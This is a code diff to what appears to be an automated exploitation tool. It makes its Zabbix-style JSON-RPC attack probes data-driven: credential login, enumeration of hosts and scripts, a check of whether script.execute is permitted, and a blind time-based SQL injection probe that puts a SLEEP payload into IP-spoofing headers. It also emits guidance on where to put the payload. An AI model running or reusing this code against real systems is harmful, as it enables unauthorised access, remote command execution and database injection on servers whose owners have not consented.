@@ -16214,6 +16214,141 @@ def _app_request_contract(product):
     return None
 
 
+def _probe_spec(product):
+    """Return the data-driven probe spec for a product (contract.probe), or None.
+    This is what makes the challenge enumeration/checks scale without code: a new
+    app declares its login/version/objects/action/injection probes in YAML."""
+    c = _app_request_contract(product)
+    return (c or {}).get("probe") if c else None
+
+
+def _spec_fill(params, resolved):
+    """Substitute {hostid}/{scriptid}/... placeholders in a param dict from the
+    resolved ids (first value), leaving unknown placeholders as a benign '0'."""
+    import re as _re
+    resolved = resolved or {}
+    out = {}
+    for k, v in (params or {}).items():
+        if isinstance(v, str):
+            def _sub(m):
+                key = m.group(1)
+                vals = resolved.get(key) or []
+                return str(vals[0]) if vals else "0"
+            out[k] = _re.sub(r"\{(\w+)\}", _sub, v)
+        else:
+            out[k] = v
+    return out
+
+
+def _spec_jsonrpc(base, ct, method, params, token=None, timeout=15):
+    """One generic JSON-RPC call. Returns (result, error)."""
+    import httpx as _hx
+    body = {"jsonrpc": "2.0", "method": method, "params": params or {}, "id": 1}
+    if token:
+        body["auth"] = token
+    try:
+        r = _hx.post(base, json=body, headers={"Content-Type": ct or "application/json-rpc"},
+                     verify=False, timeout=timeout)
+        j = r.json() if r.status_code < 500 else {}
+        return j.get("result"), j.get("error")
+    except Exception as e:  # noqa: BLE001
+        return None, str(e)
+
+
+def _spec_jsonrpc_login(base, spec, auth, timeout=15):
+    """Generic JSON-RPC login per spec.login (tries each user_field)."""
+    lg = (spec or {}).get("login") or {}
+    if not (auth and auth.get("username")):
+        return None
+    for uf in (lg.get("user_fields") or ["username"]):
+        params = {uf: auth["username"], (lg.get("pass_field") or "password"): auth.get("password")}
+        res, _ = _spec_jsonrpc(base, spec.get("content_type"), lg.get("method", "user.login"),
+                               params, timeout=timeout)
+        if res:
+            return res
+    return None
+
+
+def _spec_enumerate_objects(base, spec, token, timeout=12):
+    """Generic object enumeration per spec.objects → {id_field: [{id,name}]}."""
+    inv = {}
+    for o in (spec.get("objects") or []):
+        res, _ = _spec_jsonrpc(base, spec.get("content_type"), o.get("method"),
+                               {"output": [o.get("id_field"), o.get("name_field")], "limit": 25},
+                               token=token, timeout=timeout)
+        if isinstance(res, list):
+            idf, nmf = o.get("id_field"), o.get("name_field")
+            vals = [{"id": it.get(idf), "name": it.get(nmf, "")} for it in res if it.get(idf)]
+            if vals:
+                inv[idf] = vals
+    return inv
+
+
+def _spec_version(base, spec, timeout=12):
+    """Generic version probe per spec.version (JSON-RPC method)."""
+    v = (spec or {}).get("version") or {}
+    if not v.get("method"):
+        return None
+    res, _ = _spec_jsonrpc(base, spec.get("content_type"), v["method"], {}, timeout=timeout)
+    return res if isinstance(res, str) else None
+
+
+def _spec_action_permitted(base, spec, token, resolved, timeout=15):
+    """Generic action-permission probe per spec.action_probe → bool."""
+    ap = (spec or {}).get("action_probe") or {}
+    if not ap.get("method"):
+        return None
+    res, err = _spec_jsonrpc(base, spec.get("content_type"), ap["method"],
+                             _spec_fill(ap.get("params"), resolved), token=token, timeout=timeout)
+    node = {"result": res, "error": err}
+    for k in (ap.get("success_path") or ["result", "response"]):
+        node = node.get(k) if isinstance(node, dict) else None
+        if node is None:
+            break
+    return node == ap.get("success_value", "success")
+
+
+def _spec_injection_probe(base, spec, token, resolved, timeout=25):
+    """Generic blind-timing injection-vector probe per spec.injection_probe.
+    Tests the IP-spoof header set (carriers: headers) or a body param
+    (carriers: body:<name>) with SLEEP(0) vs SLEEP(5). Returns [{carrier,where,...}]."""
+    import time as _t
+    ip_probe = (spec or {}).get("injection_probe") or {}
+    if not ip_probe.get("method"):
+        return []
+    tmpl = ip_probe.get("payload_template") or "1'-(SELECT SLEEP({N}))-'"
+    params = _spec_fill(ip_probe.get("params"), resolved)
+    carriers_cfg = str(ip_probe.get("carriers") or "headers")
+    confirmed = []
+
+    def _timed_header(h, sec):
+        import httpx as _hx
+        hdrs = {"Content-Type": spec.get("content_type") or "application/json-rpc"}
+        if h:
+            hdrs[h] = tmpl.replace("{N}", str(sec))
+        body = {"jsonrpc": "2.0", "method": ip_probe["method"], "params": params,
+                "auth": token, "id": 1}
+        t0 = _t.time()
+        try:
+            _hx.post(base, json=body, headers=hdrs, verify=False, timeout=sec + 30)
+        except Exception:  # noqa: BLE001
+            pass
+        return _t.time() - t0
+
+    if carriers_cfg == "headers":
+        for h in _IP_INJECTION_HEADERS:
+            try:
+                b0, b5 = _timed_header(h, 0), _timed_header(h, 5)
+            except Exception:  # noqa: BLE001
+                continue
+            if (b5 - b0) >= 3.5:
+                confirmed.append({"carrier": h, "where": "header",
+                                  "payload_template": tmpl, "delta": round(b5 - b0, 1),
+                                  "endpoint": spec.get("endpoint", "")})
+                break
+    return confirmed
+
+
 def _enforce_request_contract(command, product, resolved_ids):
     """Deterministically apply a product's KNOWN request contract to a command:
     rename a wrong-named anti-CSRF param to the contract's param and set its live
@@ -21177,37 +21312,14 @@ def _enumerate_access_inventory(ip, port, product=None, auth=None,
     if session_cookie:
         hdr["Cookie"] = session_cookie
     try:
-        # ── Zabbix: API inventory (hosts, scripts, users, templates) ──
-        if "zabbix" in prod_l and u and p:
-            with _hx.Client(verify=False, timeout=timeout) as c:
-                tok = None
-                for pk in ("username", "user"):
-                    r = c.post(base + "/api_jsonrpc.php",
-                               json={"jsonrpc": "2.0", "method": "user.login",
-                                     "params": {pk: u, "password": p}, "id": 1},
-                               headers={"Content-Type": "application/json-rpc"})
-                    tok = (r.json() or {}).get("result") if r.status_code == 200 else None
-                    if tok: break
-                if tok:
-                    for method, otype, out_fields in (
-                        ("host.get", "hostid", ["hostid", "name"]),
-                        ("script.get", "scriptid", ["scriptid", "name", "command"]),
-                        ("usergroup.get", "usrgrpid", ["usrgrpid", "name"]),
-                        ("templategroup.get", "groupid", ["groupid", "name"]),
-                    ):
-                        try:
-                            rr = c.post(base + "/api_jsonrpc.php",
-                                        json={"jsonrpc": "2.0", "method": method,
-                                              "params": {"output": out_fields, "limit": 25},
-                                              "auth": tok, "id": 2},
-                                        headers={"Content-Type": "application/json-rpc"})
-                            items = (rr.json() or {}).get("result") or []
-                            vals = [{"id": it.get(otype), "name": it.get("name", "")}
-                                    for it in items if it.get(otype)]
-                            if vals:
-                                inv[otype] = vals
-                        except Exception:  # noqa: BLE001
-                            continue
+        # ── DATA-DRIVEN: JSON-RPC object enumeration from the product's probe
+        #    spec (scales without code — Zabbix objects now come from YAML) ──
+        _spec = _probe_spec(product)
+        if _spec and _spec.get("transport") == "jsonrpc" and u and p:
+            _b = f"{base}{_spec.get('endpoint','/api_jsonrpc.php')}"
+            _tok = _spec_jsonrpc_login(_b, _spec, auth, timeout=timeout)
+            if _tok:
+                inv.update(_spec_enumerate_objects(_b, _spec, _tok, timeout=timeout))
         # ── Grafana: dashboards + datasources ──
         elif "grafana" in prod_l:
             with _hx.Client(verify=False, timeout=timeout, headers=hdr) as c:
@@ -21451,24 +21563,22 @@ def _run_one_building_block(probe, ip, port, product, analysis, auth,
         except Exception:  # noqa: BLE001
             return False
     if probe == "version":
-        # Zabbix: apiinfo.version (no auth). Generic: Server header.
-        try:
-            with _hx.Client(verify=False, timeout=timeout) as c:
-                if "zabbix" in (product or "").lower():
-                    rr = c.post(base + "/api_jsonrpc.php",
-                                json={"jsonrpc": "2.0", "method": "apiinfo.version",
-                                      "params": {}, "id": 1},
-                                headers={"Content-Type": "application/json-rpc"})
-                    ver = (rr.json() or {}).get("result")
-                else:
+        # DATA-DRIVEN: spec.version (JSON-RPC). Fallback: Server header.
+        ver = None
+        _spec = _probe_spec(product)
+        if _spec and _spec.get("transport") == "jsonrpc":
+            ver = _spec_version(f"{base}{_spec.get('endpoint','/api_jsonrpc.php')}", _spec, timeout)
+        if not ver:
+            try:
+                with _hx.Client(verify=False, timeout=timeout) as c:
                     ver = c.get(base + "/").headers.get("Server")
-            if ver:
-                _record_confirmation(tgt, "version_applies", str(ver), "confirmed",
-                                     evidence=f"detected version {ver}", method="probe",
-                                     claim_value=str(ver), product=product)
-                return True
-        except Exception:  # noqa: BLE001
-            return False
+            except Exception:  # noqa: BLE001
+                ver = None
+        if ver:
+            _record_confirmation(tgt, "version_applies", str(ver), "confirmed",
+                                 evidence=f"detected version {ver}", method="probe",
+                                 claim_value=str(ver), product=product)
+            return True
         return False
     if probe == "session" and session_cookie:
         try:
@@ -21494,34 +21604,33 @@ def _run_one_building_block(probe, ip, port, product, analysis, auth,
             except Exception:  # noqa: BLE001
                 return False
         return False
-    if probe == "action_permitted" and "zabbix" in (product or "").lower() \
-            and auth and auth.get("username"):
-        try:
-            with _hx.Client(verify=False, timeout=timeout) as c:
-                tok = None
-                for pk in ("username", "user"):
-                    r = c.post(base + "/api_jsonrpc.php",
-                               json={"jsonrpc": "2.0", "method": "user.login",
-                                     "params": {pk: auth["username"], "password": auth.get("password")},
-                                     "id": 1}, headers={"Content-Type": "application/json-rpc"})
-                    tok = (r.json() or {}).get("result")
-                    if tok:
-                        break
-                if not tok:
-                    return False
-                ex = c.post(base + "/api_jsonrpc.php",
-                            json={"jsonrpc": "2.0", "method": "script.execute",
-                                  "params": {"scriptid": "1", "hostid": "10084"},
-                                  "auth": tok, "id": 1},
-                            headers={"Content-Type": "application/json-rpc"})
-                ok = ((ex.json() or {}).get("result") or {}).get("response") == "success"
-            if ok:
-                _record_confirmation(tgt, "action_permitted", "script.execute",
-                                     "confirmed", evidence="benign script.execute succeeded",
-                                     method="api_execute", product=product)
-            return ok
-        except Exception:  # noqa: BLE001
+    if probe == "action_permitted" and auth and auth.get("username"):
+        # DATA-DRIVEN: spec.action_probe (login + benign action + success check).
+        _spec = _probe_spec(product)
+        if not (_spec and _spec.get("transport") == "jsonrpc"):
             return False
+        _b = f"{base}{_spec.get('endpoint','/api_jsonrpc.php')}"
+        _tok = _spec_jsonrpc_login(_b, _spec, auth, timeout=timeout)
+        if not _tok:
+            return False
+        # resolve any {hostid}-style placeholder in the action params from the ledger
+        _res = {}
+        try:
+            with get_db() as c, c.cursor() as cur:
+                cur.execute("SELECT claim_key, claim_value FROM public.confirmed_facts "
+                            "WHERE target=%s AND claim_type='object_id' AND status='confirmed'",
+                            (tgt,))
+                for ck, cv in cur.fetchall():
+                    _res.setdefault(ck, []).append(cv)
+        except Exception:  # noqa: BLE001
+            pass
+        ok = _spec_action_permitted(_b, _spec, _tok, _res, timeout=timeout)
+        if ok:
+            _record_confirmation(tgt, "action_permitted",
+                                 (_spec.get("action_probe") or {}).get("method", "action"),
+                                 "confirmed", evidence="benign action probe succeeded",
+                                 method="api_execute", product=product)
+        return bool(ok)
     return False
 
 
@@ -21545,6 +21654,14 @@ def _probe_injection_vectors(ip, port, product, resolved=None, auth=None,
     prod_l = (product or "").lower()
     resolved = resolved or {}
     confirmed = []
+    # ── DATA-DRIVEN path: use the product's probe spec (scales without code) ──
+    _spec = _probe_spec(product)
+    if _spec and _spec.get("transport") == "jsonrpc" and auth and auth.get("username"):
+        _base = f"http://{ip}:{port or 80}{_spec.get('endpoint','/api_jsonrpc.php')}"
+        _tok = _spec_jsonrpc_login(_base, _spec, auth, timeout=timeout)
+        if _tok:
+            confirmed = _spec_injection_probe(_base, _spec, _tok, resolved, timeout=timeout)
+        return _build_injection_vector_result(confirmed)
     # ── Zabbix: audit-log clientip sink, triggered on API script.execute ──
     if "zabbix" in prod_l and auth and auth.get("username"):
         base = f"http://{ip}:{port or 80}/api_jsonrpc.php"
@@ -21592,6 +21709,12 @@ def _probe_injection_vectors(ip, port, product, resolved=None, auth=None,
                                       "endpoint": "/api_jsonrpc.php (script.execute) "
                                                   "or /zabbix.php?action=script.execute"})
                     break
+    return _build_injection_vector_result(confirmed)
+
+
+def _build_injection_vector_result(confirmed):
+    """Shared result/guidance builder for the injection-vector probe (used by
+    both the data-driven spec path and the legacy hardcoded path)."""
     bits = []
     if confirmed:
         c = confirmed[0]
@@ -21601,7 +21724,7 @@ def _probe_injection_vectors(ip, port, product, resolved=None, auth=None,
             f"(observed +{c['delta']}s on SLEEP(5)). Put the payload in that "
             f"{c['where']}, NOT in a body/query param. Payload template: "
             f"{c['payload_template']} — replace {{N}} with the delay seconds. "
-            f"Trigger endpoint: {c['endpoint']}.")
+            + (f"Trigger endpoint: {c['endpoint']}." if c.get('endpoint') else ""))
     return {"confirmed": confirmed, "guidance": "\n".join(bits)}
 
 
